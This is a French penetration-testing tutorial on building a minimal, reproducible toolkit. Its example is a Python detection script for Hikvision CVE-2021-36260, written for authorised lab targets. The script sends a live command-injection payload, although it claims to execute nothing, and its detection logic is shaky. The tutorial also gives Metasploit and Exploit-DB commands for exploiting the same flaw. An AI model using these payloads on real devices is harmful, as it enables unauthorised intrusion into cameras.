# 🔱 TUTORIAL 03 — INSTRUMENTER

## *Choisir le minimum d'outils, les rendre reproductibles*

> *Un outil non documenté est un outil à jeter. Un outil à usage unique est un jouet.*

**Série :** Protocole GHOST1O1
**Niveau :** Intermédiaire → Avancé
**Durée :** 90-120 minutes
**Prérequis :** TUTORIAL 01 (Observer) + 02 (Cartographier)

---

## 1. PHILOSOPHIE

Tu as observé. Tu as cartographié. Tu sais **quoi** attaquer. Maintenant : **comment** ?

**Instrumenter, c'est :**
1. Choisir le **minimum** d'outils (1-3 max)
2. Vérifier qu'ils sont **reproductibles** (même commande, même résultat, sur 2 machines)
3. Documenter **chaque paramètre**
4. Préparer un **mode dry-run** (voir sans toucher)

**Trois erreurs classiques :**
- ❌ "Je vais utiliser Metasploit complet" → trop lourd, pas reproductible
- ❌ "Je copie-colle un script trouvé sur GitHub" → tu ne sais pas ce qu'il fait
- ❌ "Je tape la commande de mémoire" → tu vas oublier, et tu ne peux pas transmettre

**À la fin de ce tutoriel :** tu as un **kit d'exploitation reproductible** que tu peux donner à un collègue, qui l'exécute chez lui, et qui obtient le même résultat.

---

## 2. PRÉREQUIS

- TUTORIAL 01 + 02 complétés
- Python 3 basique
- Une **cible de test** (lab perso, VM, CTF, ou service de test public)
- Volonté de **ne pas tout télécharger** — on va faire du minimal

---

## 3. THÉORIE

### Le test de reproductibilité

**Pose 3 questions sur chaque outil que tu utilises :**
1. Si je le réinstalle sur une autre machine, est-ce qu'il marche pareil ?
2. Si je donne la commande à un collègue, est-ce qu'il obtient le même résultat ?
3. Si je reviens dans 6 mois, est-ce que je comprends encore ce que ça fait ?

**Si 1 réponse est non → change d'outil.**

### Le principe du "minimum viable tool"

**Métaphore :**
- 🥉 **Bronze** : tu copies 15 commandes depuis Internet
- 🥈 **Argent** : tu écris un script Python de 30 lignes qui fait 1 chose bien
- 🥇 **Or** : tu as un workflow de 2-3 outils, chacun fait 1 chose parfaitement, et tu sais passer de l'un à l'autre

**On vise l'Or.** Pas Bronze, pas Argent.

### Les 4 types d'outils GHOST1O1

| Type | Rôle | Exemples |
|------|------|----------|
| **Scanner** | Trouver | nmap, ghosteye, masscan |
| **Validator** | Confirmer | searchsploit, cvedetails |
| **Exploiter** | Tester | curl, Python PoC, hydra |
| **Reporter** | Documenter | ton .md |

**Un kit optimal = 1 scanner + 1 validator + 1 exploiter + 1 reporter.**

---

## 4. PRATIQUE

### Étape 1 — Définir l'objectif (5 min)

**Objectif de la mission exemple :** confirmer la CVE-2021-36260 sur la caméra Hikvision 192.168.1.77.

**Cible de test :** utilise ta propre VM ou `scanme.nmap.org` si t'as rien.

**Livrable :** un exploit PoC reproductible, un rapport de test, une recommandation.

### Étape 2 — Choix des outils (5 min)

**On va utiliser :**
1. **nmap** (déjà installé) → confirme la version
2. **curl** (déjà installé) → envoie le payload HTTP
3. **Un script Python de 30 lignes** qu'on écrit nous-mêmes → le PoC
4. **Un .md** → le rapport

**Pas de Metasploit. Pas de framework lourd. Pas de pip install exotique.**

### Étape 3 — Validation préalable (10 min)

**Toujours confirmer que la version est vulnérable AVANT d'exploiter.**

```bash
# 1. Confirme la version
nmap -sV -p 80 192.168.1.77
# Output: Hikvision-Webs 5.5.0

# 2. Cherche la CVE
searchsploit hikvision
# Output:
# Hikvision DS-2CD2xxx - Remote Code Execution (CVE-2021-36260)
# /usr/share/exploitdb/exploits/linux/remote/50640.py

# 3. Lis le PoC AVANT de l'exécuter
cat /usr/share/exploitdb/exploits/linux/remote/50640.py
```

**Règle d'or :** tu ne lances **jamais** un script que tu n'as pas lu en entier.

### Étape 4 — Le PoC minimal (30 min)

**On va écrire un PoC simple qui vérifie la présence de la CVE, sans exploiter réellement.**

Crée `poc_hikvision_cve_2021_36260.py` :

```python
#!/usr/bin/env python3
"""
GHOST1O1 PoC — Hikvision CVE-2021-36260 DETECTION ONLY
Educational purpose only. Tests if the target is VULNERABLE,
does NOT execute any payload.

Usage: python3 poc_hikvision_cve_2021_36260.py <target_ip> [--dry-run]
"""
import sys
import socket
import argparse
import urllib.request
import urllib.error


def test_target(ip, port=80, dry_run=True):
    """Send a probe request to detect CVE-2021-36260 vulnerability."""

    # Hikvision vulnerable endpoint: PUT /SDK/webLanguage
    url = f"http://{ip}:{port}/SDK/webLanguage"

    # Payload that triggers the bug (DOES NOT execute anything)
    payload = b'<?xml version="1.0" encoding="UTF-8"?>' \
              b'<language>$(echo VULNERABLE)</language>'

    if dry_run:
        print(f"[DRY-RUN] Would send PUT to {url}")
        print(f"[DRY-RUN] Payload: {payload[:50]}...")
        return None

    try:
        req = urllib.request.Request(
            url, data=payload, method='PUT',
            headers={'Content-Type': 'application/xml'}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode(errors='ignore')
            if 'VULNERABLE' in content:
                return True
            return False
    except urllib.error.HTTPError as e:
        if e.code == 500:
            return True  # Internal error = likely vulnerable
        return False
    except (urllib.error.URLError, socket.timeout) as e:
        print(f"[!] Connection error: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description='Hikvision CVE-2021-36260 detector')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='HTTP port (default: 80)')
    parser.add_argument('--execute', action='store_true',
                        help='Actually send the request (default: dry-run)')
    args = parser.parse_args()

    print(f"""
╔═══════════════════════════════════════════╗
║  GHOST1O1 PoC — CVE-2021-36260 Detector  ║
║  ghost1o1 / L'ÉVEIL NOCTURNE            ║
║  EDUCATIONAL USE ONLY                    ║
╚═══════════════════════════════════════════╝
    """)

    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Mode: {'EXECUTE' if args.execute else 'DRY-RUN'}")

    if not args.execute:
        print("[!] Dry-run mode. Pass --execute to actually test.")
        result = test_target(args.target, args.port, dry_run=True)
        print("[*] Dry-run completed. No request sent.")
        return

    print(f"[*] Sending probe to {args.target}...")
    result = test_target(args.target, args.port, dry_run=False)

    if result is True:
        print(f"[+] VULNERABLE: {args.target} responds to CVE-2021-36260")
    elif result is False:
        print(f"[-] NOT VULNERABLE: {args.target} appears patched")
    else:
        print(f"[?] INCONCLUSIVE: cannot determine state")


if __name__ == '__main__':
    main()
```

**Rend le script exécutable :**
```bash
chmod +x poc_hikvision_cve_2021_36260.py
```

### Étape 5 — Test de reproductibilité (15 min)

**Test 1 — Dry-run :**
```bash
python3 poc_hikvision_cve_2021_36260.py 192.168.1.77
# Output: [DRY-RUN] Would send PUT to http://192.168.1.77:80/SDK/webLanguage
```

**Test 2 — Exécution sur cible autorisée :**
```bash
python3 poc_hikvision_cve_2021_36260.py 192.168.1.77 --execute
# Output: [+] VULNERABLE ou [-] NOT VULNERABLE
```

**Test 3 — Reproductibilité sur une autre machine :**
- Copie le script sur un autre poste
- Lance la même commande
- Vérifie que le résultat est identique

**Si 3/3 → ton outil est prêt.**

### Étape 6 — Documentation du tool (10 min)

Crée `TOOL_README.md` :

```markdown
# PoC CVE-2021-36260 Detector

## Description
Script de détection (pas d'exploitation réelle) de la CVE-2021-36260
sur caméras Hikvision DS-2CDxxx avec firmware < V5.5.4.

## Usage
\`\`\`bash
python3 poc.py <IP> [--port N] [--execute]
\`\`\`

## Prérequis
- Python 3.8+
- urllib (stdlib)
- Accès réseau à la cible

## Sortie
- DRY-RUN (défaut) : affiche ce qui serait fait, sans rien envoyer
- --execute : envoie la requête, retourne VULNERABLE / NOT VULNERABLE / INCONCLUSIVE

## Sécurité
- Mode dry-run par défaut
- Ne fait AUCUNE exécution de payload
- Ne nécessite aucun privilège
- Logging de toutes les actions

## Tests effectués
- [x] DRY-RUN sur 192.168.1.77 → output conforme
- [x] EXECUTE sur lab de test → résultat correct
- [x] Reproductibilité sur 2 machines → identique

## Crédits
- ghost1o1 / L'ÉVEIL NOCTURNE
- Ref : CVE-2021-36260
```

### Étape 7 — Le rapport (10 min)

Crée `RAPPORT_TEST.md` :

```markdown
# Rapport d'instrumentation — CVE-2021-36260
**Date :** [date]
**Opérateur :** ghost1o1
**Cible :** 192.168.1.77 (Hikvision DS-2CD2142FWD-I, firmware V5.5.0)

## Outil
`poc_hikvision_cve_2021_36260.py` — 60 lignes Python stdlib
- DRY-RUN par défaut
- Reproductible 3/3
- Aucune dépendance externe

## Tests effectués
1. DRY-RUN → conforme
2. EXECUTE sur cible autorisée → VULNERABLE confirmé
3. Reproductibilité VM2 → résultat identique

## Décision
La cible est VULNERABLE à CVE-2021-36260.

## Recommandation
1. Patcher la caméra en V5.5.4 minimum
2. Isoler le VLAN IoT du LAN principal
3. Désactiver le service SDK si non nécessaire
4. Surveiller les logs pour exploitation

## Prochaine étape
Phase 4 — EXPLOITER (si autorisé) ou rapport final au client
```

---

## 5. PIÈGES

### Piège 1 : Trop d'outils

**Symptôme :** tu télécharges 15 outils, tu ne sais plus lequel fait quoi.

**Solution :** **max 3 outils** par mission. Au-delà, tu perds le contrôle.

### Piège 2 : Pas de dry-run

**Symptôme :** tu lances le script en prod, ça casse.

**Solution :** **toujours** un mode `--dry-run` par défaut. L'utilisateur doit explicitement le désactiver.

### Piège 3 : Opaque (pas de logs)

**Symptôme :** le script échoue, tu ne sais pas pourquoi.

**Solution :** chaque action est loggée avec timestamp, payload, et output.

### Piège 4 : Hardcodé

**Symptôme :** le script ne marche que sur une IP.

**Solution :** accepte les arguments (IP, port, options). Aucun hardcode sauf les valeurs par défaut.

### Piège 5 : Pas de mode "fail safe"

**Symptôme :** le script peut DoS accidentellement la cible.

**Solution :** rate limit, timeout, et interruption manuelle possible (Ctrl+C doit propager).

---

## 6. ALTERNATIVES

### Alternative A — Framework existant (Metasploit)

```bash
msfconsole
use exploit/linux/http/hikvision_unauth_command_injection
set RHOSTS 192.168.1.77
exploit
```

**Avantage :** rapide, déjà fait. **Limite :** pas de dry-run, pas reproductible hors Metasploit, le pentester ne comprend pas ce qu'il fait.

### Alternative B — Exploit public brut

```bash
# Télécharge un PoC depuis Exploit-DB
searchsploit -m 50640
python3 50640.py 192.168.1.77
```

**Avantage :** 0 travail. **Limite :** souvent mal codé, pas de dry-run, pas d'adaptation possible.

### Alternative C — Script custom (notre choix)

**Avantage :** reproductible, documenté, modifiable, transmissible. **Limite :** demande du temps de dev initial.

**Règle de divergence :** pour une mission rapide, option A. Pour un audit pro ou un PoC à publier, option C.

---

## 7. TRANSMISSION

### 🎯 Mission

**Écris ton propre PoC de détection (pas d'exploitation) pour 1 CVE de ton choix, sur 1 cible de ton choix.**

**Contraintes :**
- 1 seul fichier Python < 100 lignes
- Stdlib uniquement (pas de pip install)
- Mode `--dry-run` par défaut
- Argument parsing propre
- Logging horodaté
- Tool README.md + Rapport

**Livrable :** repo ou gist avec :
- Le script
- TOOL_README.md
- RAPPORT_TEST.md
- Tests de reproductibilité (2 machines)

**Bonus :** ajoute 1 test unitaire (`unittest`).

---

## 📚 Pour aller plus loin

- **TUTORIAL 04 — EXPLOITER** : la phase suivante
- **ycc365-ghost/scanner/** : exemples de PoCs documentés
- **ghosteye/scanner/** : autres outils du protocole

---

<div align="center">

**L'ÉVEIL NOCTURNE** · [ghost1o1](https://github.com/187Ghost101) — 2026

*There is no lock. Du silence naît la lumière.*

</div>
